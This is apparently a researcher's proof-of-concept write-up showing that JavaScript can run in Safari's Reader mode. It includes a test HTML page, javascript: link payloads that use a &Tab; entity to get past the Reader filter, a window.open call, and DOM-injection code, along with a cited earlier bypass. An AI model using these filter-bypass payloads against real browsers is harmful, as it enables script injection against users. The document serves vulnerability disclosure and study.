# Safari-Reader-Preview-Javascript-code-execution

Reading mode is a feature implemented in most of the browsers that allows users to read arcticles in a clutter free view i.e rendering a page in a way that will be easy to read without any distraction.

Have you ever wonder how browsers achive it? During the rendering process, browsers removes all unnecessary code, like javaScript, iframes, other embedding elements etc. 

Let's try to run a sample code code that embeds a few elments to see how safari reacts
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Safari Reader Preview JavaScript Code execution</title>
</head>
<body>
    <h2 style="color: red;">macOS. It’s why there’s nothing else like a Mac</h2>
    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p>
    <p>macOS is the operating system that powers every Mac. It lets you do things you simply can’t with other computers. That’s because it’s designed specifically for the hardware it runs on — and vice versa. macOS comes with an entire suite of beautifully designed apps. It works hand in hand with iCloud to keep photos, documents and other stuff up to date on all your devices. It makes your Mac work like magic with your iPhone and other Apple devices. And it’s been built from the ground up with privacy and security in mind.</p><br>
    <a href="https://www.apple.com/">Source: Apple.com</a><br><br>
    <iframe src="https://www.bing.com" frameborder="0"></iframe>
    <embed src="https://www.bing.com" type="">
    <object data="https://www.bing.com" type=""></object>
    <p onmouseover="alert(1)" style="color: red;">alert(1)</p>
    <script>alert(1);</script>
</body> 
</html>     
```
And this is how our page randered in safari
![1](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2012-20-44.png)

Now if you see a tiny lined button at the start of address bar, that is what indicates whether the reader mode is available or not for the perticular webpage. 
Let's put the document in reading mode to see how it looks
![2](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2012-28-52.png)

As expected safari created a nice clutter free view by modifying the DOM. Let's look at the DOM to check what exactly happened.
![3](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2012-32-11.png)

And as you may noticed `iframe`, `embed`, `object`, `script` and `onmouseover` is removed. 
But what is interesting is a hyper link that points to apple.com, so as you click on the link you will be redirected to apple.com.

So since the anchor tag is allowed, the next idea that came to my mind is to use javascript URI
Let's modify the last few lines our sample code and to see what happens.

```
<a href="https://www.apple.com/">Source: Apple.com</a><br>
<a href="javascript:alert(1)">Evil link</a>   
```
Now safari removed the link that points to javascript URI while the link to apple.com is same as can be seen in below snapshot

![4](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2012-45-29.png)

After i came across this blogpost [Safari Reader UXSS](https://alf.nu/SafariReaderUXSS) from `Erling ` which shows a bypass that URLs with `javascript:` are filtered, but ones with `JaVASCRiPT:` or  `javaScript:` are not.

So this behaviour is already fixed by the safari team, Let's try to bypass it again. first thing first is use HTML5 entities to build a link with javascript URI, the first and most obvious payload will be 
```
<a href="jav&Tab;ascript:alert(1)">Evil link</a>
```
And it worked! 

![5](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2013-15-27.png)

But, if you try to click on the link it will not work. even there no error in the console as displayed in below image

![6](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2013-20-32.png)

Seems there is another challenge for me. Next the idea is to find out what is happening here. 

In order to find out why our javascript code is not working we can define a invalid javascript code to identify whether the browser is interpreting it or not. 
Let's again modfiy a few lines in our sample code as follows
```
<a href="https://www.apple.com/">Source: Apple.com</a><br>
<a href="jav&Tab;ascript:invalidFunction();">Evil link</a>
```
And as you can see below it throws a nice error

![7](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2013-30-53.png)

Now what we can conclude is that somehow browser is identifying certain javascript code and will not allows us to execute it. 

I have tested several functions during this time and figured out that at least `window.open` is working so let's modify our sample code and check the results

Modfied code
```
<a href="https://www.apple.com/">Source: Apple.com</a><br>
<a href="jav&Tab;ascript:var a = window.open('');a.alert(window.location.href)">Evil link</a><br>
```

![8](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2016-15-21.png)

As you can see the javascript code is executing in contaxt to `safari-reader` which is a pseudo-protocol used in safari reading mode. 

We can also do funny stuff to disturb the user in order to break safari's promise.
Let's again remodify the last few lines and see how it works
```
<a href="https://www.apple.com/">Source: Apple.com</a><br>
<a href="jav&Tab;ascript:var p = document.createElement('p');p.innerHTML='<marquee scrollamount=25><img src=https://cdn.pixabay.com/photo/2017/10/26/20/00/pumpkin-2892303_1280.jpg height=400 width=400></marquee>';document.documentElement.appendChild(p)">Evil link</a><br>
```
and it will create a annoying moving pumkin image on the screen as displayed in the below screenshot

![9](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screenshot%20at%20Oct%2017%2016-54-35.png)

Check the video proof of concept 
![10](https://github.com/c0d3G33k/Safari-Reader-Preview-Javascript-code-execution/blob/master/Screen%20Recording%202019-10-17%20at%204.54.52%20PM.mov)

Now since we can execute javascript code in reader mode, I tried to escalted it to universal cross site scripting(uXSS) but could not get success. 

